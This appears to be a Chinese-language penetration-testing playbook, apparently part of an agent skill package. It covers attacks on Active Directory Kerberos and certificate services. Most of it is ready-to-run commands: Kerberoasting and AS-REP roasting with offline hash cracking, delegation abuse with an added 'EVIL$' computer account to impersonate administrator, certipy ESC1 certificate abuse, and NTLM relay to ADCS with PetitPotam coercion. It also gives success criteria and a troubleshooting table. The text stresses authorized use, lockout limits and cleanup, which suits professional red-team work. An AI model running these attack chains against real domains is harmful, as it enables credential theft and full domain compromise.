# 01 Kerberos 与 ADCS

> 配套 `ad-cloud/SKILL.md`、`references/kerberos-and-adcs.md`。
> 只在明确授权的域/账号/主机上执行；先同步时间（±5 分钟），并确认账号锁定阈值。
## 0. 前置与降噪
```bash
export DOMAIN='corp.local' DC='10.0.0.10' USER='alice' PASS='P@ssw0rd'
sudo chronyc makestep 2>/dev/null || sudo ntpdate -u "$DC"
nxc smb "$DC" --pass-pol -u '' -p ''
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC"   # 只枚举，不请求
```

- 同一账号认证失败 2 次立即停，不要拿锁定阈值做“试试看”。
- Kerberoast/AS-REP 分别落 4769/4768；控制频率，优先单账号/单 SPN。

**成功判据**：时间偏差 <5 分钟，锁定阈值/密码策略已记录，凭据做过一次低噪音校验。
**失败判据**：`KRB_AP_ERR_SKEW` 未处理、或在不知道锁定策略时批量尝试。
## 1. Kerberoasting
```bash
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
  -request-user '<svc>' -outputfile evidence/kerb/kerb.hashes
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
  -request -outputfile evidence/kerb/kerb-all.hashes

hashcat -m 13100 evidence/kerb/kerb.hashes wordlist.txt   # RC4 TGS-REP
hashcat -m 19700 evidence/kerb/kerb.hashes wordlist.txt   # AES128 TGS-REP
hashcat -m 19800 evidence/kerb/kerb.hashes wordlist.txt   # AES256 TGS-REP
```

**成功判据**：拿到可离线破解的 TGS，且破解出明文，或用该 hash 完成下一步
（PtH/票据伪造需匹配 etype）。
**失败判据**：只有 TGS/hash 未破解（只是素材）；无 SPN；账号仅 AES 而字典不匹配；
`STATUS_ACCOUNT_LOCKED_OUT` 后继续尝试。
## 2. AS-REP Roasting
```bash
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -usersfile users.txt \
  -format hashcat -outputfile evidence/kerb/asrep.hashes
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -request-user '<user>' \
  -no-pass -format hashcat -outputfile evidence/kerb/asrep-one.hash

hashcat -m 18200 evidence/kerb/asrep.hashes wordlist.txt   # RC4 AS-REP
hashcat -m 19900 evidence/kerb/asrep.hashes wordlist.txt   # AES256 AS-REP
```

**成功判据**：hash 破解出明文，或可直接用于 Kerberos 预认证/离线复用。
**失败判据**：账号启用了预认证、账号被锁定、或只有 AES 而字典不匹配。
## 3. 委派
```bash
impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
# Constrained：S4U2Self + S4U2Proxy
impacket-getST -spn 'cifs/<target>' -impersonate administrator \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass "$DOMAIN/administrator@<target>"

# RBCD：需要写目标计算机对象的 msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-addcomputer "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
  -computer-name 'EVIL$' -computer-pass 'P@ss1234'
impacket-rbcd -action write -delegate-to '<target>$' -delegate-from 'EVIL$' \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
```

- Unconstrained：控制被配置的主机并让高权账号认证到它，捕获 TGT（`Rubeus monitor`/`sekurlsa::tickets`）。
- 判据：以目标身份拿到服务票据，`whoami` 返回预期账号。
- 失败：SPN 不匹配、`msDS-AllowedToDelegateTo` 未包含目标、目标拒绝协议转换、无 RBCD 写权限。

## 4. ADCS 枚举与 ESC1

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout

certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" \
  -ca '<CA>' -template '<Tpl>' -upn "administrator@$DOMAIN"
certipy auth -pfx administrator.pfx -dc-ip "$DC"
```

- ESC1：模板 `Enrollee Supplies Subject`、`Client Authentication` EKU、当前账号 `Enroll`、无审批。
- `certipy find` 报 vulnerable **不等于**可利用；必须确认可注册、模板允许目标用法、无审批。
- ESC2 Any Purpose、ESC3 注册代理、ESC4 模板 ACL、ESC5 PKI 对象 ACL、ESC6 CA 的
  `EDITF_ATTRIBUTESUBJECTALTNAME2`、ESC7 CA 管理权限、ESC8 HTTP 注册端点见技能 reference；
  参数以本机 `certipy` 版本为准。

**成功判据**：`certipy auth` 返回目标 TGT/hash，并能访问授权内资源。
**失败判据**：CA 拒绝 SAN、模板需审批、证书缺客户端认证 EKU、或 `KDC_ERR_CLIENT_REVOKED`。

## 5. NTLM relay 与 ESC8

```bash
nxc smb <target> -u '' -p '' --gen-relay-list relay_targets.txt
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of evidence/relay

certipy relay -ca '<CA>' -template 'DomainController'
impacket-ntlmrelayx -t 'http://<CA_HOST>/certsrv/certfnsh.asp' \
  -smb2support --adcs --template 'DomainController'
petitpotam.py <listener_ip> <target_ip>   # 触发，需单独授权
```

- SMB→SMB 需目标未强制 signing；LDAP relay 需 LDAP signing 未强制；
  ADCS HTTP 需 EPA 未开。
- 先验证再投入时间；`relay_targets.txt` 只放授权目标。

**成功判据**：建立可用会话，或拿到证书并用 `certipy auth -pfx` 得到目标 TGT/hash。
**失败判据**：只收到入站认证请求；signing/EPA 已开；HTTP 端点只允许 Kerberos。

## 6. 证据与失败处理

| 现象 | 原因 | 处理 |
|---|---|---|
| `KRB_AP_ERR_SKEW` | 时钟偏移 | 同步后只重试一次 |
| `STATUS_ACCOUNT_LOCKED_OUT` | 触发锁定 | 立即停，换账号/来源并报告 |
| `certipy req` 拒绝 | 无 Enroll/需审批/无 SAN | 查模板 ACL、EKU、manager approval |
| `certipy auth` 失败 | 用途/CA 链/账号状态 | 查 EKU、`NTAuthCertificates`、撤销 |
| relay 无会话 | signing/EPA | 换目标或改打 ADCS HTTP |
| getST 失败 | SPN/委派属性错 | 核对 `msDS-AllowedToDelegateTo`/RBCD |

- 每条路径写清：源主体 → 动作 → 目标主体 → 结果；附命令、时间、返回码。
- 测试后清理临时计算机账号、证书请求、上传工具；恢复被修改的模板/ACL（若有备份）。

**误报/边界**：有 `GenericAll`/`WriteDACL` 只是可利用前提，不等于已经提权；
拿到证书不等于拿到 TGT；报告要区分“配置缺陷/拿到证书/拿到 TGT/成功横向”。
